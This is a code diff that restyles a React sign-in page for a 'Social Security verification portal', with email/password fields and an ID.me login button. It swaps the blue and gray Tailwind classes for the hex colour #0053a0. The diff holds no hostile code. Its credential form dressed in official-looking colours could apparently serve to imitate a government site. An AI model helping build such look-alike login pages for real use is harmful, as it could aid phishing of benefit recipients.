@@ -90,10 +90,10 @@ export default function SignIn() {
   };
 
   return (
-    <div className="flex min-h-[calc(100vh-4rem)] flex-col items-center justify-center bg-gray-50 px-4 py-8">
-      <div className="w-full max-w-md space-y-8">
+    <div className="flex min-h-[calc(100vh-4rem)] flex-col items-center justify-center bg-[#0053a0] px-4 py-8">
+      <div className="w-full max-w-md space-y-8 rounded-lg bg-white p-8 shadow-md">
         <div className="text-center">
-          <h1 className="text-3xl font-bold text-blue-800">Sign In</h1>
+          <h1 className="text-3xl font-bold text-[#0053a0]">Sign In</h1>
           <p className="mt-2 text-gray-600">
             Sign in to access your Social Security verification portal
           </p>
@@ -115,7 +115,7 @@ export default function SignIn() {
                 id="email"
                 type="email"
                 {...register("email")}
-                className="mt-1 block w-full rounded-md border border-gray-300 px-3 py-2 placeholder-gray-400 shadow-sm focus:border-blue-500 focus:outline-none focus:ring-blue-500"
+                className="mt-1 block w-full rounded-md border border-gray-300 px-3 py-2 placeholder-gray-400 shadow-sm focus:border-[#0053a0] focus:outline-none focus:ring-[#0053a0]"
                 placeholder="Email address"
               />
               {errors.email && (
@@ -131,7 +131,7 @@ export default function SignIn() {
                 id="password"
                 type="password"
                 {...register("password")}
-                className="mt-1 block w-full rounded-md border border-gray-300 px-3 py-2 placeholder-gray-400 shadow-sm focus:border-blue-500 focus:outline-none focus:ring-blue-500"
+                className="mt-1 block w-full rounded-md border border-gray-300 px-3 py-2 placeholder-gray-400 shadow-sm focus:border-[#0053a0] focus:outline-none focus:ring-[#0053a0]"
                 placeholder="Password"
               />
               {errors.password && (
@@ -146,7 +146,7 @@ export default function SignIn() {
                 id="remember-me"
                 name="remember-me"
                 type="checkbox"
-                className="h-4 w-4 rounded border-gray-300 text-blue-600 focus:ring-blue-500"
+                className="h-4 w-4 rounded border-gray-300 text-[#0053a0] focus:ring-[#0053a0]"
               />
               <label htmlFor="remember-me" className="ml-2 block text-sm text-gray-900">
                 Remember me
@@ -156,7 +156,7 @@ export default function SignIn() {
             <div className="text-sm">
               <Link
                 href="/auth/forgot-password"
-                className="font-medium text-blue-600 hover:text-blue-500"
+                className="font-medium text-[#0053a0] hover:text-[#00478c]"
               >
                 Forgot your password?
               </Link>
@@ -167,7 +167,7 @@ export default function SignIn() {
             <button
               type="submit"
               disabled={isLoading}
-              className="group relative flex w-full justify-center rounded-md border border-transparent bg-blue-800 px-4 py-2 text-sm font-medium text-white hover:bg-blue-900 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50"
+              className="group relative flex w-full justify-center rounded-md border border-transparent bg-[#0053a0] px-4 py-2 text-sm font-medium text-white hover:bg-[#00478c] focus:outline-none focus:ring-2 focus:ring-[#0053a0] focus:ring-offset-2 disabled:opacity-50"
             >
               {isLoading ? "Signing in..." : "Sign in"}
             </button>
@@ -187,7 +187,7 @@ export default function SignIn() {
               type="button"
               onClick={handleIdMeSignIn}
               disabled={isLoading}
-              className="group relative flex w-full items-center justify-center gap-2 rounded-md border border-gray-300 bg-white px-4 py-2 text-sm font-medium text-gray-700 shadow-sm hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
+              className="group relative flex w-full items-center justify-center gap-2 rounded-md border border-gray-300 bg-white px-4 py-2 text-sm font-medium text-gray-700 shadow-sm hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-[#0053a0] focus:ring-offset-2"
             >
               <Image 
                 src="/id.jpg" 
